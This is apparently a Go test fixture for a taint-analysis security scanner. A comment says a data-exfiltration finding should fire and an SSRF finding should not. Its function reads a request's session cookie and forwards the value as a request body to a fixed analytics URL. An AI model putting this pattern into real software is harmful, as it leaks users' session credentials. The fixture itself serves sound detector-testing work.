// Tainted body, fixed URL: DATA_EXFIL must fire on the body flow.  The
// session cookie is a Sensitive-tier source, so taint carries the
// DATA_EXFIL bit through to the wrapper's Do gate.  SSRF must NOT fire —
// the URL is a hardcoded literal and per-position cap attribution keeps
// the body's taint from leaking onto the URL's gate.
package fixture

import (
	"net/http"
	"strings"
)

func SyncCookie(r *http.Request) {
	c, _ := r.Cookie("session")
	body := strings.NewReader(c.Value)
	Forward("https://analytics.internal/track", body)
}
